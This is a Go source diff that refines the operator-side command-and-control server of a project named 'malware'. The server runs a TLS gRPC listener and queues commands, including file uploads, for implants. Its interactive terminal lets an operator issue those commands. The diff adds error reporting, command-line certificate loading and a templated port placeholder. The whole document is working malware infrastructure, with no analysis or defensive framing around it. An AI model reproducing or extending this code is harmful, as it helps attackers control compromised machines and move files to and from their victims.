@@ -10,7 +10,9 @@ import (
 	"io/ioutil"
 	"malware/common"
 	pb "malware/common/messages"
+	"malware/common/types"
 	"net"
+	"os"
 	"strconv"
 	"strings"
 	"time"
@@ -22,9 +24,18 @@ type c2 struct {
 	term  *terminal.Terminal
 }
 
+func (c2 *c2) writeString(str string) {
+	c2.term.Write([]byte(str))
+}
+
 func (c2 *c2) handleReply(reply *pb.ImplantReply) {
-	c2.term.Write([]byte(strings.Replace(reply.String(), "\\n", "\n", -1)))
-	c2.term.Write([]byte("\n"))
+	if err := reply.GetError(); err != 0 {
+		c2.writeString("Error: " + types.ErrorToString[err] + "\n")
+	} else {
+
+		c2.writeString(strings.Replace(reply.String(), "\\n", "\n", -1))
+		c2.writeString("\n")
+	}
 }
 
 func (c2 *c2) CheckCommandQueue(_ context.Context, req *pb.CheckCmdRequest) (*pb.CheckCmdReply, error) {
@@ -70,22 +81,22 @@ func (c2 *c2) handle(text string) {
 		message := &pb.UploadFile{Filename: parts[1], Contents: out}
 		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Uploadfile{Uploadfile: message}}
 	default:
-		fmt.Println(parts[0])
+		c2.term.Write([]byte("Cmd not found: "))
+		c2.term.Write([]byte(parts[0] + "\n"))
+		fmt.Println()
 	}
 }
 func (c2 *c2) ReadUserInput() {
 	line, err := c2.term.ReadLine()
-
+	defer func() { recover() }()
 	for {
 		if err == io.EOF {
-			c2.term.Write([]byte(line + "\n"))
-			fmt.Println()
-			break
-		}
-		if (err != nil && strings.Contains(err.Error(), "control-c break")) || len(line) == 0 {
+			return
+		} else if (err != nil && strings.Contains(err.Error(), "control-c break")) || len(line) == 0 {
 			line, err = c2.term.ReadLine()
 		} else {
 			c2.handle(line)
+
 			line, err = c2.term.ReadLine()
 		}
 	}
@@ -95,8 +106,18 @@ func (c2 *c2) ReadUserInput() {
 func main() {
 	// TODO: Replace with %PORT%
 	// TODO: Replacewith %certfile% %keyfile%
-	creds, _ := credentials.NewServerTLSFromFile("MyCertificate.crt", "MyKey.key")
-	c2 := &c2{port: 8000, queue: make(chan *pb.CheckCmdReply, 100)}
+
+	if len(os.Args) != 3 {
+		panic("Require Cert and Key as argument")
+	}
+
+	creds, err := credentials.NewServerTLSFromFile(os.Args[1], os.Args[2])
+
+	if err != nil {
+		panic(err)
+	}
+
+	c2 := &c2{port: _C2_PORT_, queue: make(chan *pb.CheckCmdReply, 100)}
 	host := fmt.Sprintf(":%d", c2.port)
 	listener, err := net.Listen("tcp", host)
 
@@ -120,10 +141,11 @@ func main() {
 	c2.term = term
 
 	go func() {
+		defer term.ReleaseFromStdInOut()
 		c2.ReadUserInput()
-		term.ReleaseFromStdInOut()
 		server.Stop()
+
 	}()
 	server.Serve(listener)
-
+	fmt.Println("Exiting")
 }
